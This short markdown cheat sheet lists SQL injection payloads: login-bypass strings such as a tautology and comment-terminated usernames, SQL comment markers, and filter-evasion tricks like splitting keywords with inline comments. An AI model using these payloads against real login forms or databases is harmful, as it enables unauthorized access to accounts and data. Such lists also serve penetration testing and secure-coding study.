# SQL Injection Payloads
## Bypass password
These commands can be used to try and bypass password restricted logins
```sql
username' OR '1'='1
username'
username'--
```

## Comments
```sql
--
#
/* *
```

## Filter Bypass
```sql
SEL/**/ECT
' like '-- Use this instead of '='
```
